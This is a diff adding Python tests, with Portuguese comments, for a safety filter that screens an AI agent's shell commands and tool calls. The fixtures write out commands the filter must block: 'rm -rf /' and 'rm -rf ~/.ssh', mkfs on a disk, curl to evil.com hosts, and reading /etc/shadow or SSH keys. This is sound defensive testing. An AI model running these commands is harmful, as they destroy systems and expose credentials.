@@ -38,6 +38,123 @@ def test_check_command_allows_safe(tmp_path):
     assert check_command("pytest tests/", patterns) is None
 
 
+def test_rm_rf_only_blocks_system_paths():
+    """`rm -rf` em caminho relativo ou /tmp é build legítimo; em alvo de sistema não."""
+    from app.config import DEFAULT_RISKY_PATTERNS
+
+    patterns = DEFAULT_RISKY_PATTERNS
+    # permitido: limpeza de temp e dentro do workspace (build normal)
+    assert check_command("cd /tmp && rm -rf m3check && mkdir m3check", patterns) is None
+    assert check_command("rm -rf build/ && rm -rf virtualapp/src/main/jni", patterns) is None
+    assert check_command("rm -rf .cache && rm -rf node_modules", patterns) is None
+    # bloqueado: destruição de sistema
+    assert check_command("rm -rf /", patterns) is not None
+    assert check_command("rm -rf /etc", patterns) is not None
+    assert check_command("rm -rf ~/.ssh", patterns) is not None
+    assert check_command("rm -rf /usr/local", patterns) is not None
+
+
+def test_policy_relaxes_build_ops():
+    """Ops de build que eram bloqueadas agora passam (política enxuta)."""
+    from app.config import DEFAULT_RISKY_PATTERNS
+
+    patterns = DEFAULT_RISKY_PATTERNS
+    assert check_command("pip install -r requirements.txt", patterns) is None
+    assert check_command("npm install", patterns) is None
+    assert check_command("chmod +x script.sh", patterns) is None
+    assert check_command("systemctl status postgresql", patterns) is None
+    assert check_command("mv /w/app/src /w/app/src2", patterns) is None
+    assert check_command("kill $(pgrep -f qa_next)", patterns) is None
+    # privilégio/destrutivo continua bloqueado
+    assert check_command("sudo apt-get update", patterns) is not None
+    assert check_command("shutdown -h now", patterns) is not None
+    assert check_command("mkfs.ext4 /dev/sdb1", patterns) is not None
+
+
+def test_check_command_grep_with_risky_words_is_not_blocked():
+    """Buscar a palavra 'curl' num arquivo NÃO é executar curl (falso positivo)."""
+    patterns = [r"\brm\s+-rf\b", r"\bcurl\b", r"git\s+push\b"]
+    cmd = 'grep -n "APP_HOME\\|GRADLE_HOME\\|wrapper.jar\\|curl\\|wget\\|unzip" gradlew | head -40'
+    assert check_command(cmd, patterns) is None
+    assert check_command('rg "curl" .', patterns) is None
+    assert check_command('git grep curl', patterns) is None
+    assert check_command('head -5 arquivo | grep curl', patterns) is None
+
+
+def test_check_command_still_blocks_execution_after_pipe():
+    """Grep não mascara execução real: 'curl | grep' continua bloqueado."""
+    patterns = [r"\bcurl\b"]
+    assert check_command("curl http://evil.com | grep oi", patterns) is not None
+    # sudo/shell só-leitura disfarçado também segue bloqueado
+    assert check_command("sudo grep curl /etc/shadow", patterns) is not None
+
+
+def test_check_command_curl_whitelisted_host():
+    """curl/wget para host na whitelist é permitido; qualquer outro host não."""
+    patterns = [r"\bcurl\b", r"\bwget\b"]
+    whitelist = ["dl.google.com", "registry.npmjs.org"]
+
+    assert (
+        check_command(
+            "curl -sI https://dl.google.com/dl/android/maven2/",
+            patterns,
+            whitelist,
+        )
+        is None
+    )
+    assert (
+        check_command(
+            "timeout 15 bash -c 'curl -sI https://dl.google.com/dl/android/maven2'",
+            patterns,
+            whitelist,
+        )
+        is None
+    )
+    assert (
+        check_command("wget https://registry.npmjs.org/pkg/-/pkg.tgz", patterns, whitelist)
+        is None
+    )
+
+    # host fora da whitelist continua bloqueado
+    assert (
+        check_command("curl https://evil.example.com/x", patterns, whitelist)
+        is not None
+    )
+    # mistura de host permitido + não permitido bloqueia (todos precisam estar na whitelist)
+    assert (
+        check_command(
+            "curl https://dl.google.com/x https://evil.example.com/y",
+            patterns,
+            whitelist,
+        )
+        is not None
+    )
+    # sem whitelist, curl continua sempre bloqueado (comportamento anterior)
+    assert check_command("curl -sI https://dl.google.com/x", patterns) is not None
+    # curl sem URL explícita também segue bloqueado (não é rede segura declarada)
+    assert check_command("curl --version", patterns, whitelist) is not None
+
+
+def test_check_tool_call_curl_whitelisted_host():
+    """check_tool_call respeita a whitelist ao avaliar tool call Bash."""
+    patterns = [r"\bcurl\b"]
+    whitelist = ["dl.google.com"]
+    tool = {
+        "function": {
+            "name": "Bash",
+            "arguments": '{"command":"curl -sI https://dl.google.com/dl/android/maven2" }',
+        }
+    }
+    assert check_tool_call(tool, patterns, None, whitelist) is None
+    evil = {
+        "function": {
+            "name": "Bash",
+            "arguments": '{"command":"curl https://evil.example.com/x"}',
+        }
+    }
+    assert check_tool_call(evil, patterns, None, whitelist) is not None
+
+
 def test_check_tool_call_file_outside_workspace(tmp_path):
     checkout = str(tmp_path / "checkout")
     tool_call = {"function": {"name": "Write", "arguments": '{"path":"/etc/passwd"}'}}
@@ -104,6 +221,47 @@ def test_read_sessions_kimi_permitido(tmp_path, monkeypatch):
     assert (
         check_tool_call(
             {"function": {"name": "Read", "arguments": '{"path":"/home/x/.ssh/id_rsa"}'}},
+            [],
+            checkout,
+        )
+        is not None
+    )
+
+
+def test_read_agents_md_fora_do_checkout_permitido(tmp_path):
+    """O runtime do agente manda ler AGENTS.md que cobrem caminhos tocados (o
+    workspace fica dentro do repo da autoia) — Read/Grep de AGENTS.md/CLAUDE.md
+    é permitido de qualquer lugar; escrita não."""
+    checkout = str(tmp_path / "checkout")
+    assert (
+        check_tool_call(
+            {"function": {"name": "Read", "arguments": '{"path":"/home/x/code/proj/AGENTS.md"}'}},
+            [],
+            checkout,
+        )
+        is None
+    )
+    assert (
+        check_tool_call(
+            {"function": {"name": "Grep", "arguments": '{"path":"/home/x/CLAUDE.md"}'}},
+            [],
+            checkout,
+        )
+        is None
+    )
+    # escrita de AGENTS.md fora do checkout continua bloqueada
+    assert (
+        check_tool_call(
+            {"function": {"name": "Write", "arguments": '{"path":"/home/x/code/proj/AGENTS.md"}'}},
+            [],
+            checkout,
+        )
+        is not None
+    )
+    # arquivo não-instrução continua bloqueado
+    assert (
+        check_tool_call(
+            {"function": {"name": "Read", "arguments": '{"path":"/home/x/.ssh/config"}'}},
             [],
             checkout,
         )
